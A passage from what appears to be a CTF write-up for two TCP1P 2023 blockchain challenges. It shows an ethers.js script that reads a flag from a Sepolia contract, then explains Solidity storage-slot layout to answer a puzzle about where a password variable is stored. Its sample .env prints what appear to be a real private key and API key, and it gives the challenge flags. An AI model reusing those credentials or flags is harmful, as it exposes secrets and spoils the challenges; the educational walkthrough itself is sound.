style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;initialMessage&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;nonpayable&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;constructor&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;[]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;enterVenue&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;outputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;view&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;function&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;[]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;goBack&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;outputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;view&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;function&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}]
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; provider
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;provider &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ethers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;AlchemyProvider&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;sepolia&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;process&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;env&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;API_KEY)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ethers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Wallet&lt;&#x2F;span&gt;&lt;span&gt;(process&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;env&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;PRIVATE_KEY&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;provider)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;async function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;venueContract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ethers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Contract&lt;&#x2F;span&gt;&lt;span&gt;(ADDRESS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ABI&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wallet)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;message &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;await &lt;&#x2F;span&gt;&lt;span&gt;venueContract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;goBack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(message)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;await &lt;&#x2F;span&gt;&lt;span&gt;venueContract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enterVenue&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To make this script works you need to do few things.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Install Dependencies&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;code&gt;npm install --save ethers &amp;amp;&amp;amp; npm install dotenv&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure to use .env&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;sample &lt;code&gt;.env&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;PRIVATE_KEY=853024a95f52d73fe68a50e4ee11a1a2a6818ef71b63eccea9c07edde5e595c
&lt;&#x2F;span&gt;&lt;span&gt;API_KEY=SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now if we run the javascript code above then the flag will be printed to the screen.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;venue$&lt;&#x2F;span&gt;&lt;span&gt; node solve.js
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;But....&lt;&#x2F;span&gt;&lt;span&gt; You&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ve come this far... come on! just go inside!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;location&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#location&quot; aria-label=&quot;Anchor link for: location&quot;&gt;Location&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Description :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Will you accept the invitation? If so, find the party location now!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Challenge : nc ctf.tcp1p.com 20005
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Lets connect to challenge&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;venue$&lt;&#x2F;span&gt;&lt;span&gt; nc ctf.tcp1p.com 20005
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;===Going &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span&gt; The Party====
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt; Find the party location
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; need to solve a simple riddle regarding a SLOT
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer&lt;&#x2F;span&gt;&lt;span&gt; everything correctly, and find the exact location!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:&lt;&#x2F;span&gt;&lt;span&gt; In which Slot is Password Stored&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ll answer with and ONLY WITH [numbers]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;ex: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;0,1,2,3,4.....99
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Note: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    -   Slot start from 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;    -   If it doesn&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span&gt; stored on SLOT, answer 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Identification&lt;&#x2F;span&gt;&lt;span&gt; Required for Guest
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge2 {
&lt;&#x2F;span&gt;&lt;span&gt;    address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; private investor;
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Answer: 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Lets understood challenge clearly&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;It is EVM storage puzzle&lt;&#x2F;li&gt;
&lt;li&gt;We have to find the storage slot of the password&lt;&#x2F;li&gt;
&lt;li&gt;Slots starts from 0&lt;&#x2F;li&gt;
&lt;li&gt;If password not stored on storage then answer will be 0&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, Lets learn EVM storage layout&lt;&#x2F;p&gt;
&lt;p&gt;State variables of contracts are stored in storage in a compact way such that multiple values sometimes use the same storage slot. Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot 0.&lt;&#x2F;p&gt;
&lt;p&gt;The below image will illustrate the storage layout of the EVM.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;tcp1p23&#x2F;tcp1pctf23_location1.png&quot; class=&quot;autoimg&quot;&#x2F;&gt;
&lt;p&gt;State variable stored in the continous manner in storage slots of EVM. Each slot of size 32 bytes or 256 bits only. See an example how the state variables are stores in the storage slots.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;Contract MyContract {
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 zero&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;                          &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; in slot 0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256) one&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; in slot 1
&lt;&#x2F;span&gt;&lt;span&gt;  address two&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;                          &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; in slot 2 
&lt;&#x2F;span&gt;&lt;span&gt;  bool a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;                              &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; in slot 3 - 1 byte
&lt;&#x2F;span&gt;&lt;span&gt;  uint8 b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;                             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; in slot 3 - 1 byte 
&lt;&#x2F;span&gt;&lt;span&gt;  bytes16 c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;                           &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; in slot 3 - 16 bytes
&lt;&#x2F;span&gt;&lt;span&gt;  address immutable noWhere&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;           &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Do not stored on storage
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The Solidity dont store constant or immutable variables in storage instead the vaues will replaced in every occurrence of these variables with their assigned value in the contract‚Äôs bytecode.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Enough knowedge for the challenge, Lets solve challenge.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Here in Challenge2 the password is stored in slot 2 as address[2] will reserve slot 0 and slot 1 for two addresses. Slot 2 will be allocated to password.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;contract StorageChallenge2 {
&lt;&#x2F;span&gt;&lt;span&gt;    address[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] private investor&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; slot 0 - 1
&lt;&#x2F;span&gt;&lt;span&gt;    uint64 private password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; slot 2
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; slot 3
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; slot 4
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Lets see Challenge7, Here the password declared as &lt;code&gt;immutable&lt;&#x2F;code&gt; so it wont stored in any slot so the answer would be 0.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;contract StorageChallenge7 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes4 private key_1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes16 private key_2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private Token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address private immutable Investor&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address private Courier&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private immuatble password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; no slot for password 
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
